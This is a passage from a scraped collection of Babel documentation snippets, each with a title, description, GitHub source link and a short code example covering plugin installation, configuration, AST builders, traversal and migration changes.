\"mod\";\n```\n\n----------------------------------------\n\nTITLE: Running Nodemon with Babel Node Directly\nDESCRIPTION: This snippet provides an alternative method to run Nodemon with Babel Node directly without using an npm script. It's crucial to use a double dash (`--`) to separate Nodemon's options from the arguments passed to `babel-node`. `--presets=@babel/preset-env` sets the Babel preset and `--ignore='foo\\|bar\\|baz'` ignores specific files during compilation.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/nodemon/usage.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnodemon --exec babel-node --presets=@babel/preset-env --ignore='foo\\|bar\\|baz' -- path/to/script.js\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/standalone via npm\nDESCRIPTION: This command demonstrates how to install @babel/standalone using npm. This provides a local copy of the library that can be included in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save @babel/standalone\n```\n\n----------------------------------------\n\nTITLE: Transformed Function Name (Example)\nDESCRIPTION: The result of applying the transform-function-name plugin. The anonymous function has been converted into a named function.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-function-name.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar number = function number(x) {\n  return x;\n};\n```\n\n----------------------------------------\n\nTITLE: Template Literals Old Behavior (JavaScript)\nDESCRIPTION: This snippet shows the old Babel 6 behavior for template literals when the `loose` option is enabled, using string concatenation.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_28\n\nLANGUAGE: javascript\nCODE:\n```\n// old v6 behavior: [\"@babel/plugin-transform-template-literals\", { \"loose\": true }]\n\"foo\" + bar;\n```\n\n----------------------------------------\n\nTITLE: Target Specific Node Types JavaScript\nDESCRIPTION: This code snippet demonstrates how to target specific node types (FunctionDeclaration) in the AST using @babel/traverse. It traverses the AST and modifies the name of the function declaration's identifier to 'x'.\nSOURCE: https://github.com/babel/website/blob/main/docs/traverse.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\ntraverse(ast, {\n  FunctionDeclaration: function(path) {\n    path.node.id.name = \"x\";\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Configuration for String Named Modules\nDESCRIPTION: This configuration shows how to enable parsing support for string named modules in Babel using the `@babel/syntax-module-string-names` plugin. The `presets` key is included to demonstrate how to use this plugin with other Babel presets.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets:\": [\"@babel/preset-env\"],\n  \"plugins\": [\n    \"@babel/syntax-module-string-names\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Destructuring Private Fields in Babel 7\nDESCRIPTION: Illustrates destructuring private fields within Babel 7. This enables extracting private class members using destructuring syntax within methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_27\n\nLANGUAGE: javascript\nCODE:\n```\nclass Example { #x = 1; method() { const { #x: x } = this; } }\n```\n\n----------------------------------------\n\nTITLE: Plugin Ordering - JSON\nDESCRIPTION: This snippet shows the correct order of plugins in babel.config.json when using @babel/plugin-proposal-destructuring-private with other class feature plugins like @babel/plugin-transform-class-properties.  The destructuring-private plugin should come before the class-properties plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-destructuring-private.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-proposal-destructuring-private\",\n    \"@babel/plugin-transform-class-properties\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Function Name (Example)\nDESCRIPTION: Transforms an anonymous arrow function expression into a named function expression. This improves stack traces and debugging.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-function-name.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet number = x => x;\n```\n\n----------------------------------------\n\nTITLE: Destructuring Evaluation Call Expressions JavaScript\nDESCRIPTION: Demonstrates how destructuring evaluation is handled with call expressions.  This fixes an issue where destructuring assignments with function calls or member expressions on the right-hand side were not being correctly optimized.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\n[x, y] = [a(), obj.x];\n// was transforming to\nx = a();\ny = obj.x;\n// now transforms to\nvar _ref = [a(), obj.x];\nx = _ref[0];\ny = _ref[1];\n```\n\n----------------------------------------\n\nTITLE: Creating an ArrowFunctionExpression Node\nDESCRIPTION: Creates an AST node representing an arrow function expression. Requires `params` (an array of `Identifier | Pattern | RestElement`), `body` (a `BlockStatement | Expression`), and `async` (a boolean, default: `false`). The `expression` parameter is also required. Use `t.isArrowFunctionExpression(node, opts)` to check if a node is an ArrowFunctionExpression and `t.assertArrowFunctionExpression(node, opts)` to assert that a node is an ArrowFunctionExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.arrowFunctionExpression(params, body, async);\n```\n\n----------------------------------------\n\nTITLE: Creating an AnyTypeAnnotation Node\nDESCRIPTION: Creates an AST node representing an `any` type annotation in Flow.  There are no parameters. Use `t.isAnyTypeAnnotation(node, opts)` to check if a node is an AnyTypeAnnotation and `t.assertAnyTypeAnnotation(node, opts)` to assert that a node is an AnyTypeAnnotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.anyTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Traverse Clear Cache APIs (JavaScript)\nDESCRIPTION: Demonstrates how to use the `traverse.clearCache`, `traverse.clearCache.clearPath`, and `traverse.clearCache.clearScope` APIs to clear the caches used by the traverse function. This can be useful for invalidating cached path and scope information.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\ntraverse.clearCache(); // clears both path's and scope cache\ntraverse.clearCache.clearPath();\ntraverse.clearCache.clearScope();\n```\n\n----------------------------------------\n\nTITLE: Rollup Configuration with Babel Plugin (JavaScript)\nDESCRIPTION: This code snippet defines a Rollup configuration object. It specifies the input file ('src/index.js'), the output directory ('output') and format ('esm'), and uses the @rollup/plugin-babel to transpile the code. The babelHelpers option is set to 'bundled'.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/rollup/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport babel from '@rollup/plugin-babel';\n\nconst config = {\n  input: 'src/index.js',\n  output: {\n    dir: 'output',\n    format: 'esm'\n  },\n  plugins: [babel({ babelHelpers: 'bundled' })]\n};\n\nexport default config;\n```\n\n----------------------------------------\n\nTITLE: Keyword and Reserved Word Helper Functions\nDESCRIPTION: This TypeScript code defines various functions for checking if a given word is a keyword or reserved word in JavaScript. These functions provide different levels of strictness based on the context (e.g., strict mode, module context).\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-validator-identifier.md#_snippet_5\n\nLANGUAGE: typescript\nCODE:\n```\nfunction isReservedWord(word: string, inModule: boolean): boolean\nfunction isStrictReservedWord(word: string, inModule: boolean): boolean\nfunction isStrictBindOnlyReservedWord(word: string): boolean\nfunction isStrictBindReservedWord(word: string, inModule: boolean): boolean\nfunction isKeyword(word: string): boolean\n```\n\n----------------------------------------\n\nTITLE: @babel/helper-replace-supers - Named Export Removal\nDESCRIPTION: This snippet illustrates the removal of the named export `environmentVisitor` from `@babel/helper-replace-supers`. It provides a migration path, recommending importing it from `@babel/helper-environment-visitor` instead. It emphasizes the proper way to import this visitor after the change. Dependencies: `@babel/helper-replace-supers`, `@babel/helper-environment-visitor`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_76\n\nLANGUAGE: diff\nCODE:\n```\n- import { environmentVisitor } from \"@babel/helper-replace-supers\";\n+ import environmentVisitor from `@babel/helper-environment-visitor`;\n```\n\n----------------------------------------\n\nTITLE: Creating EnumStringBody in JavaScript\nDESCRIPTION: This snippet demonstrates creating an `EnumStringBody` AST node using Babel's `t.enumStringBody` method. The `members` parameter is a required array of `EnumStringMember` or `EnumDefaultedMember` nodes, and `explicitType` and `hasUnknownMembers` are required boolean values. This represents the body of an enum containing string-valued members.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_57\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumStringBody(members);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel preset-env with useBuiltIns: entry\nDESCRIPTION: This JSON config sets Babel's 'useBuiltIns' to 'entry', configuring the preset to add imports for polyfills to the entry file. With the '@babel/polyfill' deprecated, you now import from 'core-js/stable'.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_16\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"targets\": {\n          \"edge\": \"17\",\n          \"firefox\": \"60\",\n          \"chrome\": \"67\",\n          \"safari\": \"11.1\"\n        },\n        \"useBuiltIns\": \"entry\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ExportSpecifier in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExportSpecifier` AST node using Babel's `t.exportSpecifier` method. The `local` and `exported` parameters are required and should be `Identifier` nodes. The `exportKind` property defaults to 'value' and is excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_66\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.exportSpecifier(local, exported);\n```\n\n----------------------------------------\n\nTITLE: @babel/helper-replace-supers - skipAllButComputedKey Replacement\nDESCRIPTION: This code demonstrates the removal of `skipAllButComputedKey` from `@babel/helper-replace-supers` and its replacement with `requeueComputedKeyAndDecorators` from `@babel/helper-environment-visitor`. It provides a find-and-replace approach for updating existing plugins. It details the specific replacement needed for preserving the old behavior. Dependencies: `@babel/helper-replace-supers`, `@babel/helper-environment-visitor`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_77\n\nLANGUAGE: javascript\nCODE:\n```\nimport { skipAllButComputedKey } from \"@babel/helper-replace-supers\";\nskipAllButComputedKey(path);\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport { requeueComputedKeyAndDecorators } from `@babel/helper-environment-visitor`;\npath.skip();\nrequeueComputedKeyAndDecorators(path);\n```\n\n----------------------------------------\n\nTITLE: Enable Import Attributes Syntax Plugin (JSON)\nDESCRIPTION: Enables the `@babel/plugin-syntax-import-attributes` plugin in Babel configuration.  Replaces the deprecated `@babel/syntax-import-assertions` plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"plugins\": [\n-    \"@babel/syntax-import-assertions\",\n+    \"@babel/syntax-import-attributes\"\n   ]\n }\n```\n\n----------------------------------------\n\nTITLE: Dynamic Property Names in ES5 React\nDESCRIPTION: Illustrates how to set state using dynamic property names in ES5 React components.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nvar Form = React.createClass({\n  onChange: function(inputName, e) {\n    var stateToSet = {};\n    stateToSet[inputName + 'Value'] = e.target.value;\n    this.setState(stateToSet);\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Install Plugin via NPM Shell\nDESCRIPTION: This shell command installs the `@babel/plugin-proposal-function-sent` plugin as a development dependency using npm.  The `--save-dev` flag ensures that the plugin is added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-sent.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-function-sent\n```\n\n----------------------------------------\n\nTITLE: Configuring the plugin\nDESCRIPTION: Configures Babel to use the safari-id-destructuring-collision-in-function-expression plugin. This plugin is added to the plugins array in the babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-id-destructuring-collision-in-function-expression.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/helper-environment-visitor\nDESCRIPTION: This command installs the `@babel/helper-environment-visitor` package using npm. This is a prerequisite for using the helper in a Babel plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/helper-environment-visitor\n```\n\n----------------------------------------\n\nTITLE: Loading ES6 modules with RequireJS and the 'es6!' plugin (JavaScript)\nDESCRIPTION: This snippet demonstrates how to load an ES6 module using the `es6!` plugin in RequireJS.  The `define` function is used to declare a module that depends on an ES6 module. The 'es6!' prefix tells RequireJS to use the requirejs-babel plugin to transpile the ES6 module before executing it.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/requirejs/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\ndefine([\"es6!your-es6-module\"], function (module) {\n  // ...\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel es2015 Preset with Spec Option\nDESCRIPTION: This snippet demonstrates how to configure Babel's es2015 preset with the `spec` option enabled. This option adds runtime checks to ensure arrow functions are not instantiated and wraps template literal expressions in `String` calls.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-24-6.14.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// .babelrc\n{\n  \"presets\": [\n    [\"es2015\", { \"spec\": true }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Fixing constructor default argument referencing self (JavaScript)\nDESCRIPTION: This snippet addresses an error that occurred when a constructor's default argument referred to itself or its own static property. It ensures that code generated for such scenarios is valid.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\n// was producing invalid code\nclass Ref {\n  static nextId = 0\n  constructor(id = ++Ref.nextId, n = id) {\n    this.id = n\n  }\n}\n\nassert.equal(1, new Ref().id)\nassert.equal(2, new Ref().id)\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareExportAllDeclaration AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareExportAllDeclaration` to create a declare export all declaration node in the AST. It's used for Flow type annotations for exporting all declarations from a module. It takes the source (StringLiteral) and optional attributes (ImportAttribute array).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_34\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareExportAllDeclaration(source, attributes);\n```\n\n----------------------------------------\n\nTITLE: Using Optional Chaining Assign Plugin via Node API\nDESCRIPTION: Demonstrates how to use the Babel Node API to transform code with the @babel/plugin-syntax-optional-chaining-assign plugin. This is achieved by passing the plugin name within the plugins array during the transformSync call, enabling parsing of optional chaining assignment syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining-assign.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-optional-chaining-assign\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Importing Module Members JavaScript\nDESCRIPTION: This code snippet demonstrates how to import all exported members from a module into a namespace using the `import * as` syntax. It imports all members from `lib/math` into the `math` namespace. It depends on the `lib/math` module. It outputs the value of `2π` to the console.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app.js\nimport * as math from \"lib/math\";\nconsole.log(\"2π = \" + math.sum(math.pi, math.pi));\n```\n\n----------------------------------------\n\nTITLE: Class transformation output with _classCallCheck\nDESCRIPTION: This code demonstrates the output of Babel's class transformation without loose mode.  It defines the `_classCallCheck` helper function, which is responsible for ensuring that the class constructor is called with the `new` keyword. This helper can be duplicated across many files.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime-corejs2.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _classCallCheck(instance, Constructor) {\n  //...\n}\n\nvar Circle = function Circle() {\n  _classCallCheck(this, Circle);\n};\n```\n\n----------------------------------------\n\nTITLE: Transformed Unicode escapes JavaScript\nDESCRIPTION: This is the transformed code of Unicode escapes by Babel. It shows the compiled result of the previous example. It declares and logs a variable with equivalent legacy syntax after Babel transforms the code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _ud835_udc9c = \"\\uDAAA\\uDFE1\";\nconsole.log(_ud835_udc9c);\n```\n\n----------------------------------------\n\nTITLE: Creating a CatchClause Node\nDESCRIPTION: Creates an AST node representing a catch clause. Requires `body` (a `BlockStatement`) and accepts an optional `param` parameter (an `Identifier | ArrayPattern | ObjectPattern`, defaults to `null`). Use `t.isCatchClause(node, opts)` to check if a node is a CatchClause and `t.assertCatchClause(node, opts)` to assert that a node is a CatchClause.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.catchClause(param, body);\n```\n\n----------------------------------------\n\nTITLE: Parsing with Smart Pipeline Operator in JavaScript\nDESCRIPTION: This JavaScript snippet shows how to configure `@babel/parser` to parse code using the Smart Pipeline Operator. It requires installing `@babel/parser` and specifying the `proposal: \"smart\"` option in the `pipelineOperator` plugin configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-12-03-7.2.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst ast = babel.parse(code, {\n  plugins: [\n    [\"pipelineOperator\", { proposal: \"smart\" }]\n  ]\n})\n```\n\n----------------------------------------\n\nTITLE: Transforming with React JSX Source via Node API\nDESCRIPTION: This JavaScript code snippet uses the Babel Node API to transform code with the `@babel/plugin-transform-react-jsx-source` plugin. The plugin is specified within the plugins array in the options object, allowing to add the source file and line number data to JSX.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-source.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-jsx-source\"],\n});\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Partial Application with Pipeline\nDESCRIPTION: This snippet shows how to use the partial application feature (supported since Babel 7.4.0) in conjunction with the pipeline operator. The `?` placeholder indicates where arguments should be partially applied.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = person.score\n  |> double\n  |> add(7, ?)\n  |> boundScore(0, 100, ?);\n\n```\n\n----------------------------------------\n\nTITLE: Create Function Type Parameter AST Node (JavaScript)\nDESCRIPTION: Creates a `FunctionTypeParam` AST node using the `t.functionTypeParam` builder.  This node represents a parameter in a function type annotation.  Parameters include the parameter name and its type annotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_75\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.functionTypeParam(name, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Plugin Usage via CLI\nDESCRIPTION: Command-line interface (CLI) usage of the Babel plugin. This command transforms a JavaScript file (`script.js`) using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-arrow-functions script.js\n```\n\n----------------------------------------\n\nTITLE: Class with Uninitialized Private Field (JavaScript)\nDESCRIPTION: This JavaScript code defines a class with an uninitialized private field access.  The `noUninitializedPrivateFieldAccess` assumption tells Babel that code never attempts to access private fields on classes before they are initialized.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass MyClass {\n  static #id = 123;\n\n  method() {\n    return MyClass.#id;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Configuration for Import Assertions\nDESCRIPTION: This configuration shows how to update the Babel configuration to use `@babel/plugin-syntax-import-assertions` instead of `@babel/plugin-syntax-module-attributes`.  This reflects the renaming of the proposal and the updated syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"plugins\": [\n-    [\"@babel/syntax-module-attributes\", { \"version\": \"may-2020\" }]\n+    \"@babel/syntax-import-assertions\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Shorthand Properties - Example In\nDESCRIPTION: This JavaScript code demonstrates the input to the @babel/plugin-transform-shorthand-properties plugin.  It uses shorthand property syntax. The plugin transforms this into explicit key-value pairs.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar o = { a, b, c };\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a file using the `@babel/plugin-transform-react-jsx-self` plugin.  It transforms `script.js` with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-self.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-jsx-self script.js\n```\n\n----------------------------------------\n\nTITLE: Install @babel/traverse\nDESCRIPTION: This command installs the @babel/traverse package as a project dependency using npm or yarn. It allows you to traverse and modify the Abstract Syntax Tree (AST) of JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/traverse.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save @babel/traverse\n```\n\n----------------------------------------\n\nTITLE: JavaScript Decorator Syntax (New Proposal)\nDESCRIPTION: This code snippet demonstrates the new decorator syntax that only allows dot property access, optionally with arguments. Complex expressions need to be wrapped in parentheses.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass MyClass {\n  @decorator\n  @dec(arg1, arg2)\n  @namespace.decorator\n  @(complex ? dec1 : dec2)\n  method() {}\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: This shell command installs the @babel/plugin-transform-object-set-prototype-of-to-assign Babel plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-set-prototype-of-to-assign.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-object-set-prototype-of-to-assign\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin `@babel/plugin-syntax-class-properties` within a `babel.config.json` file. This configuration enables Babel to parse class properties syntax when transforming JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-properties.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-class-properties\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ForInStatement in JavaScript\nDESCRIPTION: This snippet shows how to create a `ForInStatement` AST node using Babel's `t.forInStatement` method. The `left` parameter is required and can be a `VariableDeclaration` or `LVal`. The `right` parameter (an `Expression`) and `body` parameter (a `Statement`) are also required. This node represents a `for...in` loop.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_69\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.forInStatement(left, right, body);\n```\n\n----------------------------------------\n\nTITLE: Fifth Revision of replace-top-level-this-plugin (JS)\nDESCRIPTION: This final revision simplifies the code by using `environmentVisitor`. It merges the `ThisExpression` visitor with the `environmentVisitor`, which handles the complex `this`-handling logic, making the plugin cleaner and easier to understand.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nimport environmentVisitor from \"@babel/helper-environment-visitor\";\n\nmodule.exports = (api) => {\n  // highlight-next-line\n  const { types: t, traverse } = api;\n  return {\n    name: \"replace-top-level-this\",\n    // highlight-next-line\n    visitor: traverse.visitors.merge([\n      {\n        ThisExpression(path) {\n          path.replaceWith(t.identifier(\"globalThis\"));\n        }\n      },\n      // highlight-start\n      environmentVisitor\n    ]);\n    // highlight-end\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Invokes the Babel CLI to transform a JavaScript file (`script.js`) using the `@babel/plugin-proposal-throw-expressions` plugin. This allows transforming files directly from the command line.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-throw-expressions.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-throw-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Using the async attribute for external scripts\nDESCRIPTION: This snippet demonstrates using the async attribute with external scripts to load them asynchronously. This is useful when loading external scripts using @babel/standalone.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" src=\"foo.js\" async></script>\n```\n\n----------------------------------------\n\nTITLE: Throwing Runtime Errors in Babel Plugin (JavaScript)\nDESCRIPTION: This code snippet shows how Babel handles runtime errors. It iterates through constant violations and throws a code frame error when a read-only violation is encountered during transpilation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-08-16-gsoc-karl-1.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfor (const violation of (binding.constantViolations: Array)) {\n  throw violation.buildCodeFrameError(messages.get(\"readOnly\", name));\n}\n```\n\n----------------------------------------\n\nTITLE: RegExp Test with Inline Modifiers in JavaScript\nDESCRIPTION: This code snippet demonstrates how to use inline RegExp modifiers in JavaScript to enable case-insensitive matching for specific parts of a regular expression. The `(?i:a)` syntax enables the `i` flag (case-insensitive) for the enclosed 'a'. It tests the regex against various strings to showcase its behavior.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n/(?i:a)a/.test(\"aa\"); // true\n/(?i:a)a/.test(\"Aa\"); // true\n/(?i:a)a/.test(\"aA\"); // false\n```\n\n----------------------------------------\n\nTITLE: Installing babel-preset-minify\nDESCRIPTION: This command installs the babel-preset-minify package as a development dependency using npm. The --save-dev flag ensures that the package is saved in the devDependencies section of the package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-preset-minify --save-dev\n```\n\n----------------------------------------\n\nTITLE: Configuring dynamicImport plugin in .babelrc (JavaScript)\nDESCRIPTION: This snippet shows how to configure the dynamicImport plugin in .babelrc to enable dynamic imports.  It uses the parserOpts section to add the 'dynamicImport' plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n// .babelrc\n{\n  \"parserOpts\": {\n    \"plugins\": ['dynamicImport']\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Runs Babel from the command line, specifying the @babel/plugin-syntax-function-bind plugin.  The script.js file will be transformed using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-bind.md#_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-function-bind script.js\n```\n\n----------------------------------------\n\nTITLE: Using highlight function\nDESCRIPTION: Demonstrates the use of the `highlight` function to add syntax highlighting to a code snippet for display in a terminal.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { highlight } from \"@babel/code-frame\";\n\nconst code = `class Foo {\\n  constructor()\\n}`;\n\nconst result = highlight(code);\n\nconsole.log(result);\n```\n\nLANGUAGE: javascript\nCODE:\n```\nclass Foo {\n  constructor()\n}\n```\n\n----------------------------------------\n\nTITLE: Clone and Bootstrap Babel Website\nDESCRIPTION: This shell script clones the Babel website repository from GitHub and installs the necessary dependencies using Yarn. It then bootstraps the project to prepare it for development.\nSOURCE: https://github.com/babel/website/blob/main/README.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git clone git@github.com:babel/website.git\n$ yarn && yarn bootstrap\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin using npm\nDESCRIPTION: This command installs the `@start/plugin-lib-babel` package as a development dependency using npm. The `-D` flag signifies that the package is a development dependency, meaning it's only needed during development and not at runtime. This plugin likely provides functionalities to integrate Babel into the build process managed by the `@start` build system.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/start/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install -D @start/plugin-lib-babel\n```\n\n----------------------------------------\n\nTITLE: gulpBabelMinify API Usage\nDESCRIPTION: Illustrates the basic syntax of the `gulpBabelMinify` function.  It takes optional `minifyOptions` to configure the minification process and `overrides` for more advanced configurations like custom Babel core or minify preset.\nSOURCE: https://github.com/babel/website/blob/main/docs/gulp-babel-minify.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ngulpBabelMinify(minifyOptions, overrides);\n```\n\n----------------------------------------\n\nTITLE: Export Statement 